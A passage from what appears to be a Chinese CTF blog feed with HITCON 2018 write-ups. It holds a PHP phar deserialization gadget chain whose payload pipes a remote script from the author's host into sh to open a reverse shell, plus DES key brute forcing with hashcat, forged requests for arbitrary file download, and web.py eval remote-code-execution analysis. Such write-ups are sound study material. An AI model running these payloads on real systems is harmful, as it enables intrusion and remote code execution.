<span class="keyword">protected</span> $bufferLimit = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $processors;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($methods, $command)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processors = $methods;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer = [$command];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">clone</span> <span class="keyword">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $cmd = "curl http://wonderkun.cc:3000/wonderkun.cc:888|sh";</span><br><span class="line"></span><br><span class="line">    $obj = <span class="keyword">new</span> \Monolog\Handler\SyslogUdpHandler(</span><br><span class="line">        <span class="keyword">new</span> \Monolog\Handler\BufferHandler(</span><br><span class="line">            [<span class="string">'current'</span>, <span class="string">'system'</span>],</span><br><span class="line">            [$cmd, <span class="string">'level'</span> =&gt; <span class="keyword">null</span>]</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">'exploit.phar'</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">'test'</span>, <span class="string">'test'</span>);</span><br><span class="line">    $phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">    $phar-&gt;setMetadata($obj);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>讲生成<code>exploit.phar</code>放到<code>wonderkun.cc/exploit.phar</code>,然后依次访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http http://13.230.134.135/?url=http://wonderkun.cc/exploit.phar</span><br><span class="line">http http://13.230.134.135/\?url\=http://www.wonderkun.cc/index.html/\&amp;data\[x\]\=@phar:///var/www/html/tmp/cache/mycache/x.x.x.x/6a2d709b1f3953e11d7cbfd14b322af4/body.cache 1=1</span><br></pre></td></tr></table></figure>

<p>就成功的反弹了shell。</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>hitcon2018</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcon2018受虐笔记二:Oh-My-Raddit-1-and-2学习</title>
    <url>/2018/10/25/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%BA%8C%20Oh-My-Raddit-1-and-2%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>之前在web中题目中也有很多次遇到密码学的问题，但大多数都是已知了加密部分的代码，也就是已知了加密算法和加密模式，攻击目的一般是泄露密钥，或者伪造明文或者泄露明文。攻击方法常用的有CBC反转， padding oracle，hash长度扩展攻击，重放攻击等。但是像这一次的唯密文攻击的，还真是第一次遇到，所以就有点无从下手，主要还是密码学的知识太匮乏了。</p>
<a id="more"></a>

<p>下面是看了别人的writeup之后，又顺着当时自己的做题思路，继续学习的过程。</p>
<h3 id="Oh-My-Raddit-1-学习笔记"><a href="#Oh-My-Raddit-1-学习笔记" class="headerlink" title="Oh-My-Raddit-1 学习笔记"></a>Oh-My-Raddit-1 学习笔记</h3><p>题目中的链接是这样的：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?s=8c762b8f22036dbbdda56facf732ffa71c3a372e4530241246449a55e25888cf98164f49a25f54a84ea0640e3adaf107cc67c8f2e688e8adf18895d89bfae58e33ae2e67609b509afb0e52f2f8b2145e"</span>&gt;</span>50 million Facebook accounts owned<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击之后就会发生一次303跳转，跳转到一个地址：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">https:<span class="type"></span>//<span class="keyword">new</span><span class="type">sroom</span>.fb.com/<span class="keyword">new</span><span class="type">s</span>/<span class="number">2018</span>/<span class="number">09</span>/security-update/</span><br></pre></td></tr></table></figure>

<p>所以猜想s参数可能跟最终跳转的url之间存在某种关系，可能是url的加密值。于是把所有的s参数值和url的值都抓取下来，并且统计长度用逗号隔开,存为csv文件，如下显示:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">密文,密文长度,url长度,url</span><br><span class="line"></span><br><span class="line">8c762b8f22036dbbdda56facf732ffa71c3a372e4530241246449a55e25888cf98164f49a25f54a84ea0640e3adaf107cc67c8f2e688e8adf18895d89bfae58e33ae2e67609b509afb0e52f2f8b2145e,160,53,https://newsroom.fb.com/news/2018/09/security-update/</span><br><span class="line"></span><br><span class="line">b8cefd6eb48eb05a2a6455031697145597fd94cc1ddf5de9d1ced9f3ba9f0671294f7e621271724379f8866765581ed27a11fbf32a65c9c5fa555e936059c30ae7e0574415898d59825eaf40b8ca4b6b4c495604c766de6410158def0234ca52d3a472f56cbc6007a2be6b76d1489fb1d1968e7d8d19f94970b8924776e4aad7fe36cd98ce5e1381db456c31e215b5bf3ca92540eb2d0a42,304,117,https://blog.netlab.360.com/70-different-types-of-home-routers-all-together-100000-are-being-hijacked-by-ghostdns-en/</span><br><span class="line"></span><br><span class="line">68935751c61b2cbf9b23a8a310cc25357d90e8ec90d21429132b8e6a7069a3af361b3d849b06b5cc92f33f42305f794b7551f5397ba46a5b452ab65a472ac6415e697a86b2b618a9c9cf94ea64cd49b2b2780d3cf5b55c51b70a9a2903fb58e786a4d5c5dc412819,208,73,https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>看到下面两条数据：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span><span class="keyword">c</span><span class="number">762</span>b<span class="number">8</span>f<span class="number">22036</span>dbbdda<span class="number">56</span>facf<span class="number">732</span>ffa<span class="number">71</span><span class="keyword">c</span><span class="number">3</span>a<span class="number">372e4530241246449</span>a<span class="number">55e25888</span>cf<span class="number">98164</span>f<span class="number">49</span>a<span class="number">25</span>f<span class="number">54</span>a<span class="number">84</span>ea<span class="number">0640e3</span>adaf<span class="number">107</span><span class="keyword">cc</span><span class="number">67</span><span class="keyword">c</span><span class="number">8</span>f<span class="number">2e688</span>e<span class="number">8</span>adf<span class="number">18895</span>d<span class="number">89</span>bfae<span class="number">58e33</span>ae<span class="number">2e67609</span>b<span class="number">509</span>afb<span class="number">0e52</span>f<span class="number">2</span>f<span class="number">8</span>b<span class="number">2145</span>e,<span class="number">160</span>,<span class="number">53</span>,https://newsroom.fb.com/news/<span class="number">2018</span>/<span class="number">09</span>/security-update/</span><br><span class="line"></span><br><span class="line">a<span class="number">164</span>de<span class="number">5</span><span class="keyword">c</span><span class="number">0574559</span><span class="keyword">c</span><span class="number">7181</span>f<span class="number">4</span>ff<span class="number">4</span>ee<span class="number">6693</span><span class="keyword">c</span><span class="number">8740</span>afb<span class="number">01</span>d<span class="number">3</span><span class="keyword">c</span><span class="number">8</span>d<span class="number">6</span>f<span class="number">1</span><span class="keyword">c</span><span class="number">5</span>bc<span class="number">1</span>d<span class="number">931</span>bb<span class="number">57</span>cf<span class="number">2</span>d<span class="number">17</span>cbc<span class="number">566279</span>d<span class="number">6</span>f<span class="number">51</span>fdf<span class="number">7</span><span class="keyword">c</span><span class="number">38111</span>ee<span class="number">10602</span>ad<span class="number">1</span>a<span class="number">9467</span>cb<span class="number">0</span>db<span class="number">9</span>d<span class="number">80</span>eb<span class="number">3</span><span class="keyword">c</span><span class="number">9</span>a<span class="number">5</span>ff<span class="number">4</span>b<span class="number">33674</span><span class="keyword">c</span><span class="number">613</span>d<span class="number">436</span>ac<span class="number">902241</span>ce<span class="number">2</span>f<span class="number">5</span>d<span class="number">5</span>ab<span class="number">0825</span>a<span class="number">6</span>bdd<span class="number">41073</span>fb<span class="number">6e31202</span>b<span class="number">4</span>fcd<span class="number">3e2</span>dc<span class="number">08</span>b<span class="number">0</span>ec<span class="number">4469e20</span>ff<span class="number">376</span>,<span class="number">208</span>,<span class="number">53</span>,https://www.securifera.com/blog/<span class="number">2018</span>/<span class="number">10</span>/<span class="number">07</span>/servicefu/</span><br></pre></td></tr></table></figure>

<p>两条数据的url长度相同，但是密文长度却相差很多，这就说明了密文可能并不仅仅是对url进行加密的结果。</p>
<p>而可能是对url和其他一些内容的加密<code>ciphertext=encrypt(url+something)</code></p>
<p><strong>仔细观察密文，可以发现密文都是16的倍数，因为密文都是16进制，所以密文长度应该都是8 bytes的倍数，于是可以猜测出此加密算法是分组加密，分组长度是8 bytes。</strong></p>
<p>下面我又进行了另外一个实验，我从密文的第一位开始，每次只修改密文一位的值，看解密后是否能够成功跳转到原来的url地址，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> copy </span><br><span class="line">randStr = <span class="string">'0123456789abcdef'</span></span><br><span class="line">host = <span class="string">"http://13.115.255.46/?s="</span></span><br><span class="line">url = list(<span class="string">'1a969e9e7488c391428ca12b3a2280f83389d6fdd40c68c29f085cacc2c7a7cc2fb7465584101c689b2058ce85aa3606dfd91fd183144892b1d39e0b730702448ca6ac0be7436e2409c5f576db0d26341afd7a398b0473de743dbdc5d810ebde3282d9a673ace6d23054124f8c79aa420bb0032c89336b1bd9d51086fba2caafaee2b8b4568118b5999b89fb35cb2fe24c181b95a8281a7b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(url)):</span><br><span class="line">    print(<span class="string">"[-] "</span>+str(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> randStr:</span><br><span class="line">        tmp = copy.deepcopy(url)</span><br><span class="line">        tmp[i] = j</span><br><span class="line">        realUrl = host + <span class="string">''</span>.join(tmp)</span><br><span class="line">        res = requests.get(realUrl,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">303</span>:</span><br><span class="line">            <span class="keyword">if</span> tmp != url:</span><br><span class="line">                print(<span class="string">"[+] "</span>+str(i)+<span class="string">":"</span>+realUrl)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> res.status_code==<span class="number">500</span>:</span><br><span class="line">            print(<span class="string">"[+] "</span>+str(i)+<span class="string">":"</span>+res.text)</span><br></pre></td></tr></table></figure>

<p>运行之后，发现：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">[-] <span class="number">95</span></span><br><span class="line">[-] <span class="number">96</span></span><br><span class="line">[+] <span class="number">96</span>:http://<span class="number">13.115</span>.<span class="number">255.46</span>/?s=<span class="number">1</span>a<span class="number">969e9</span>e<span class="number">7488</span><span class="keyword">c</span><span class="number">391428</span>ca<span class="number">12</span>b<span class="number">3</span>a<span class="number">2280</span>f<span class="number">83389</span>d<span class="number">6</span>fdd<span class="number">40</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">29</span>f<span class="number">085</span>cacc<span class="number">2</span><span class="keyword">c</span><span class="number">7</span>a<span class="number">7</span><span class="keyword">cc</span><span class="number">2</span>fb<span class="number">7465584101</span><span class="keyword">c</span><span class="number">689</span>b<span class="number">2058</span>ce<span class="number">85</span>aa<span class="number">36060</span>fd<span class="number">91</span>fd<span class="number">183144892</span>b<span class="number">1</span>d<span class="number">39e0</span>b<span class="number">730702448</span>ca<span class="number">6</span>ac<span class="number">0</span>be<span class="number">7436e2409</span><span class="keyword">c</span><span class="number">5</span>f<span class="number">576</span>db<span class="number">0</span>d<span class="number">26341</span>afd<span class="number">7</span>a<span class="number">398</span>b<span class="number">0473</span>de<span class="number">743</span>dbdc<span class="number">5</span>d<span class="number">810</span>ebde<span class="number">3282</span>d<span class="number">9</span>a<span class="number">673</span>ace<span class="number">6</span>d<span class="number">23054124</span>f<span class="number">8</span><span class="keyword">c</span><span class="number">79</span>aa<span class="number">420</span>bb<span class="number">0032</span><span class="keyword">c</span><span class="number">89336</span>b<span class="number">1</span>bd<span class="number">9</span>d<span class="number">51086</span>fba<span class="number">2</span>caafaee<span class="number">2</span>b<span class="number">8</span>b<span class="number">4568118</span>b<span class="number">5999</span>b<span class="number">89</span>fb<span class="number">35</span>cb<span class="number">2</span>fe<span class="number">24</span><span class="keyword">c</span><span class="number">181</span>b<span class="number">95</span>a<span class="number">8281</span>a<span class="number">7</span>b</span><br><span class="line">[+] <span class="number">96</span>:http://<span class="number">13.115</span>.<span class="number">255.46</span>/?s=<span class="number">1</span>a<span class="number">969e9</span>e<span class="number">7488</span><span class="keyword">c</span><span class="number">391428</span>ca<span class="number">12</span>b<span class="number">3</span>a<span class="number">2280</span>f<span class="number">83389</span>d<span class="number">6</span>fdd<span class="number">40</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">29</span>f<span class="number">085</span>cacc<span class="number">2</span><span class="keyword">c</span><span class="number">7</span>a<span class="number">7</span><span class="keyword">cc</span><span class="number">2</span>fb<span class="number">7465584101</span><span class="keyword">c</span><span class="number">689</span>b<span class="number">2058</span>ce<span class="number">85</span>aa<span class="number">36061</span>fd<span class="number">91</span>fd<span class="number">183144892</span>b<span class="number">1</span>d<span class="number">39e0</span>b<span class="number">730702448</span>ca<span class="number">6</span>ac<span class="number">0</span>be<span class="number">7436e2409</span><span class="keyword">c</span><span class="number">5</span>f<span class="number">576</span>db<span class="number">0</span>d<span class="number">26341</span>afd<span class="number">7</span>a<span class="number">398</span>b<span class="number">0473</span>de<span class="number">743</span>dbdc<span class="number">5</span>d<span class="number">810</span>ebde<span class="number">3282</span>d<span class="number">9</span>a<span class="number">673</span>ace<span class="number">6</span>d<span class="number">23054124</span>f<span class="number">8</span><span class="keyword">c</span><span class="number">79</span>aa<span class="number">420</span>bb<span class="number">0032</span><span class="keyword">c</span><span class="number">89336</span>b<span class="number">1</span>bd<span class="number">9</span>d<span class="number">51086</span>fba<span class="number">2</span>caafaee<span class="number">2</span>b<span class="number">8</span>b<span class="number">4568118</span>b<span class="number">5999</span>b<span class="number">89</span>fb<span class="number">35</span>cb<span class="number">2</span>fe<span class="number">24</span><span class="keyword">c</span><span class="number">181</span>b<span class="number">95</span>a<span class="number">8281</span>a<span class="number">7</span>b</span><br><span class="line">[+] <span class="number">96</span>:http://<span class="number">13.115</span>.<span class="number">255.46</span>/?s=<span class="number">1</span>a<span class="number">969e9</span>e<span class="number">7488</span><span class="keyword">c</span><span class="number">391428</span>ca<span class="number">12</span>b<span class="number">3</span>a<span class="number">2280</span>f<span class="number">83389</span>d<span class="number">6</span>fdd<span class="number">40</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">29</span>f<span class="number">085</span>cacc<span class="number">2</span><span class="keyword">c</span><span class="number">7</span>a<span class="number">7</span><span class="keyword">cc</span><span class="number">2</span>fb<span class="number">7465584101</span><span class="keyword">c</span><span class="number">689</span>b<span class="number">2058</span>ce<span class="number">85</span>aa<span class="number">36062</span>fd<span class="number">91</span>fd<span class="number">183144892</span>b<span class="number">1</span>d<span class="number">39e0</span>b<span class="number">730702448</span>ca<span class="number">6</span>ac<span class="number">0</span>be<span class="number">7436e2409</span><span class="keyword">c</span><span class="number">5</span>f<span class="number">576</span>db<span class="number">0</span>d<span class="number">26341</span>afd<span class="number">7</span>a<span class="number">398</span>b<span class="number">0473</span>de<span class="number">743</span>dbdc<span class="number">5</span>d<span class="number">810</span>ebde<span class="number">3282</span>d<span class="number">9</span>a<span class="number">673</span>ace<span class="number">6</span>d<span class="number">23054124</span>f<span class="number">8</span><span class="keyword">c</span><span class="number">79</span>aa<span class="number">420</span>bb<span class="number">0032</span><span class="keyword">c</span><span class="number">89336</span>b<span class="number">1</span>bd<span class="number">9</span>d<span class="number">51086</span>fba<span class="number">2</span>caafaee<span class="number">2</span>b<span class="number">8</span>b<span class="number">4568118</span>b<span class="number">5999</span>b<span class="number">89</span>fb<span class="number">35</span>cb<span class="number">2</span>fe<span class="number">24</span><span class="keyword">c</span><span class="number">181</span>b<span class="number">95</span>a<span class="number">8281</span>a<span class="number">7</span>b</span><br></pre></td></tr></table></figure>

<p>所以的密文都是对96位之后的部分进行修改，都能成功的解密出来url地址，96位之前的任意一位进行修改都会导致无法解密出来正确的url。</p>
<p><strong>这个结果可以告诉我们两个信息，第一：密文的前96位跟url相关。第二：密文的分组之间是没有依赖关系的(如果有依赖关系的话，对前面的部分进行修改，必然会导致密文整体解密失败，不会出现大片的解密成功的情况)。</strong></p>
<p>根据第一个信息，不定长的url被处理成了定长的密文，那么最容易想到的方式就是padding，但是很多url的长度是大于48 bytes的(密文长度)，所以应该不是padding。那很有可能加密的仅仅是一个定长的url ID值，然后在数据库中查出相对应的url地址。</p>
<p>根据第二个信息，因为是分组加密，并且分组之间是没有传导性的依赖关系，所以可以猜想加密模式是最简单的ECB了。</p>
<p>常用的分组加密也不过是DES和AES，但是AES最短的分组长度是128bits,所以常见的64bites分组的加密也只有是DES了。 所以猜想加密算法可能是DES-ECB。</p>
<p>又因为题目中的提示，说明密钥是小写的字母[a-z]：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> <span class="module-access"><span class="module"><span class="identifier">ENCRYPTION_KEY</span>.</span></span>islower<span class="literal">()</span></span><br></pre></td></tr></table></figure>

<p>又因为DES加密中，长度为64bits的密钥其实只有56位参与了DES运算（第8、16、24、32、40、48、56、64位是校验位），所以密钥的每个字母的二进制都要去掉最低位，所以密钥中出现的b和c在舍弃最低位之后其实是等价的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">4</span>]: bin(ord(<span class="string">'b'</span>))</span><br><span class="line">Out[<span class="number">4</span>]: <span class="string">'0b1100010'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: bin(ord(<span class="string">'c'</span>))</span><br><span class="line">Out[<span class="number">5</span>]: <span class="string">'0b1100011'</span></span><br></pre></td></tr></table></figure>

<p>所以密钥是在<code>abdfhjlnprtvxz</code>中选出8个，爆破空间是<code>14**8</code>,只要我们找到一组密文和明文的对应，就可以爆破出来密钥了。</p>
<p>将所有的明文都8 bytes个一组进行分开，发现多个明文的末尾都出现了<code>3ca92540eb2d0a42</code>,猜想这可能是DES的padding<code>\x08\x08\x08\x08\x08\x08\x08\x08</code>的加密结果。</p>
<p>然后尝试爆破这对明密文对（自己写的python程序太慢了，哎…）：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">hashcat -m 14000 3ca92540eb2d0a42:0808080808080808 -a 3 -1 acegikmoqsuwy ?1?1?1?1?1?1?1?1 --force</span><br></pre></td></tr></table></figure>

<p>最后爆破出来的密钥是<code>ldgonaro</code>，根据出题人的提示，需要获取到题目源码。</p>
<p>又发现链接：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?s=2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42"</span>&gt;</span>down<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以下载一个pdf文件，于是利用上面的密钥解密这条数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">ENCRPYTION_KEY = <span class="string">'ldgonaro'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = s.decode(<span class="string">'hex'</span>)</span><br><span class="line">        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">        data = cipher.decrypt(data)</span><br><span class="line">        print(data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e.message</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">decrypt(<span class="string">'2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42'</span>)</span><br><span class="line"><span class="comment"># 得到数据</span></span><br><span class="line"><span class="comment"># m=d&amp;f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf</span></span><br></pre></td></tr></table></figure>

<p>于是猜想这里可能是个任意文件下载，然后加密数据<code>m=d&amp;f=app.py</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">ENCRPYTION_KEY = <span class="string">'ldgonaro'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    length = DES.block_size - (len(s) % DES.block_size)</span><br><span class="line">    s = s + chr(length)*length</span><br><span class="line"></span><br><span class="line">    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(s).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">print(encrypt(<span class="string">'m=d&amp;f=app.py'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#e2272b36277c708bc21066647bc214b8</span></span><br></pre></td></tr></table></figure>

<p>访问<code>http://13.115.255.46/?s=e2272b36277c708bc21066647bc214b8</code>成功获取到题目源码。源码中有密钥。</p>
<h3 id="Oh-My-Raddit-2-学习笔记"><a href="#Oh-My-Raddit-2-学习笔记" class="headerlink" title="Oh-My-Raddit-2 学习笔记"></a>Oh-My-Raddit-2 学习笔记</h3><p>题目提示需要getshell,拿到代码就可以代码审计了。</p>
<p>主要是利用了web.py的一个任意代码执行的漏洞，参考链接<a href="https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/" target="_blank" rel="noopener">https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/</a>，下面自己的分析一下这个漏洞的成因。</p>
<p>漏洞主要存在web.py框架的db.py文件中：</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reparam</span><span class="params">(string_, dictionary)</span>:</span> </span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Takes a string and a dictionary and interpolates the string</span></span><br><span class="line"><span class="string">    using values from the dictionary. Returns an `SQLQuery` for the result.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; reparam("s = $s", dict(s=True))</span></span><br><span class="line"><span class="string">        &lt;sql: "s = 't'"&gt;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; reparam("s IN $s", dict(s=[1, 2]))</span></span><br><span class="line"><span class="string">        &lt;sql: 's IN (1, 2)'&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    dictionary = dictionary.copy() <span class="comment"># eval mucks with it</span></span><br><span class="line">    <span class="comment"># disable builtins to avoid risk for remote code exection.</span></span><br><span class="line">    dictionary[<span class="string">'__builtins__'</span>] = object()</span><br><span class="line">    vals = []</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> live, chunk <span class="keyword">in</span> _interpolate(string_):</span><br><span class="line">        <span class="keyword">if</span> live:</span><br><span class="line">            v = eval(chunk, dictionary)</span><br><span class="line">            result.append(sqlquote(v))</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            result.append(chunk)</span><br><span class="line">    <span class="keyword">return</span> SQLQuery.join(result, <span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_interpolate</span><span class="params">(format)</span>:</span> </span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Takes a format string and returns a list of 2-tuples of the form</span></span><br><span class="line"><span class="string">    (boolean, string) where boolean says whether string should be evaled</span></span><br><span class="line"><span class="string">    or not.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    from &lt;http://lfw.org/python/Itpl.py&gt; (public domain, Ka-Ping Yee)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">from</span> tokenize <span class="keyword">import</span> tokenprog</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">matchorfail</span><span class="params">(text, pos)</span>:</span></span><br><span class="line">        match = tokenprog.match(text, pos)</span><br><span class="line">        <span class="keyword">if</span> match <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> _ItplError(text, pos)</span><br><span class="line">        <span class="keyword">return</span> match, match.end()</span><br><span class="line"></span><br><span class="line">    namechars = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span> \</span><br><span class="line">        <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"</span>;</span><br><span class="line">    chunks = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        dollar = format.find(<span class="string">"$"</span>, pos)</span><br><span class="line">        <span class="keyword">if</span> dollar &lt; <span class="number">0</span>: </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nextchar = format[dollar + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nextchar == <span class="string">"&#123;"</span>:</span><br><span class="line">            chunks.append((<span class="number">0</span>, format[pos:dollar]))</span><br><span class="line">            pos, level = dollar + <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> level:</span><br><span class="line">                match, pos = matchorfail(format, pos)</span><br><span class="line">                tstart, tend = match.regs[<span class="number">3</span>]</span><br><span class="line">                token = format[tstart:tend]</span><br><span class="line">                <span class="keyword">if</span> token == <span class="string">"&#123;"</span>: </span><br><span class="line">                    level = level + <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> token == <span class="string">"&#125;"</span>:  </span><br><span class="line">                    level = level - <span class="number">1</span></span><br><span class="line">            chunks.append((<span class="number">1</span>, format[dollar + <span class="number">2</span>:pos - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> nextchar <span class="keyword">in</span> namechars:</span><br><span class="line">            chunks.append((<span class="number">0</span>, format[pos:dollar]))</span><br><span class="line">            match, pos = matchorfail(format, dollar + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> pos &lt; len(format):</span><br><span class="line">                <span class="keyword">if</span> format[pos] == <span class="string">"."</span> <span class="keyword">and</span> \</span><br><span class="line">                    pos + <span class="number">1</span> &lt; len(format) <span class="keyword">and</span> format[pos + <span class="number">1</span>] <span class="keyword">in</span> namechars:</span><br><span class="line">                    match, pos = matchorfail(format, pos + <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">elif</span> format[pos] <span class="keyword">in</span> <span class="string">"(["</span>:</span><br><span class="line">                    pos, level = pos + <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> level:</span><br><span class="line">                        match, pos = matchorfail(format, pos)</span><br><span class="line">                        tstart, tend = match.regs[<span class="number">3</span>]</span><br><span class="line">                        token = format[tstart:tend]</span><br><span class="line">                        <span class="keyword">if</span> token[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">"(["</span>: </span><br><span class="line">                            level = level + <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> token[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">")]"</span>:  </span><br><span class="line">                            level = level - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            chunks.append((<span class="number">1</span>, format[dollar + <span class="number">1</span>:pos]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chunks.append((<span class="number">0</span>, format[pos:dollar + <span class="number">1</span>]))</span><br><span class="line">            pos = dollar + <span class="number">1</span> + (nextchar == <span class="string">"$"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pos &lt; len(format): </span><br><span class="line">        chunks.append((<span class="number">0</span>, format[pos:]))</span><br><span class="line">    <span class="keyword">return</span> chunks</span><br></pre></td></tr></table></figure>

<p>函数_interpolate的目的就是为了把格式化的sql语句例如:<code>a= ${s} and b= $s</code>变为为一个list</p>
<p><code>[(0, &#39;a= &#39;), (1, &#39;s&#39;), (0, &#39; and b= &#39;), (1, &#39;s&#39;)]</code>，然后通过eval函数来获取后面dictionary定义的命名空间中变量的值：</p>
